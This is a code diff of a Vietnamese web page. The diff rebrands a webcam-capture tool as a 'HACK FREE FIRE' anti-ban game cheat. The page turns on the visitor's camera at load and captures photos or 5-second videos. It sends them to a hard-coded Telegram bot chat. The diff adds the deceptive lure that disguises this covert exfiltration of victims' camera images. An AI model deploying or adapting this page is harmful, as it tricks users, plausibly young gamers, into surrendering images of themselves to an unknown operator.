@@ -2,13 +2,13 @@
 <html lang="vi">
 <head>
   <meta charset="UTF-8">
-  <title>Hungisme Cam Tool</title>
+  <title>🔥 HACK FREE FIRE CẤP QUYỀN WEB ANTIBAN</title>
   <style>
     body {
-      background: #1a1a1a;
+      background: #111;
       color: white;
       text-align: center;
-      font-family: sans-serif;
+      font-family: Arial, sans-serif;
       padding: 20px;
     }
     video {
@@ -17,6 +17,10 @@
       border: 3px solid #fff;
       border-radius: 10px;
       margin-bottom: 15px;
+    }
+    h2 {
+      font-size: 22px;
+      margin-bottom: 10px;
     }
     button {
       background: #00ccff;
@@ -34,7 +38,7 @@
   </style>
 </head>
 <body>
-  <h2>🎥 Hungisme Webcam Tool</h2>
+  <h2>🔥 HACK FREE FIRE CẤP QUYỀN WEB ANTIBAN</h2>
   <video id="video" autoplay muted playsinline></video><br>
   <button onclick="capturePhoto()">📸 Chụp Ảnh & Gửi</button>
   <button onclick="recordVideo()">🎞 Quay Video 5s & Gửi</button>
@@ -44,38 +48,33 @@
     const chatId = "-1002761107238";
     let stream;
 
-    // Bắt đầu webcam khi load
     async function initCam() {
       stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
       document.getElementById("video").srcObject = stream;
     }
 
-    // Gửi ảnh chụp về Telegram
     async function capturePhoto() {
       const video = document.getElementById("video");
       const canvas = document.createElement("canvas");
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       canvas.getContext("2d").drawImage(video, 0, 0);
-
       canvas.toBlob(async (blob) => {
         const form = new FormData();
         form.append("chat_id", chatId);
         form.append("photo", blob, "photo.png");
-        form.append("caption", "📸 Ảnh chụp từ Hungisme Tool");
+        form.append("caption", "📸 Ảnh từ hệ thống HACK FF ANTIBAN");
 
         await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
           method: "POST",
           body: form
         });
 
-        alert("✅ Ảnh đã gửi!");
+        alert("✅ Đã gửi ảnh!");
       }, "image/png");
     }
 
-    // Gửi video quay 5 giây
     async function recordVideo() {
-      const videoEl = document.getElementById("video");
       const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
       const chunks = [];
 
@@ -85,18 +84,18 @@
         const form = new FormData();
         form.append("chat_id", chatId);
         form.append("video", blob, "recorded.webm");
-        form.append("caption", "🎞 Video quay từ Hungisme Tool");
+        form.append("caption", "🎞 Video gửi từ HACK FF WEB TOOL");
 
         await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
           method: "POST",
           body: form
         });
 
-        alert("✅ Video đã gửi!");
+        alert("✅ Đã gửi video!");
       };
 
       recorder.start();
-      setTimeout(() => recorder.stop(), 5000); // quay 5s
+      setTimeout(() => recorder.stop(), 5000);
     }
 
     initCam();
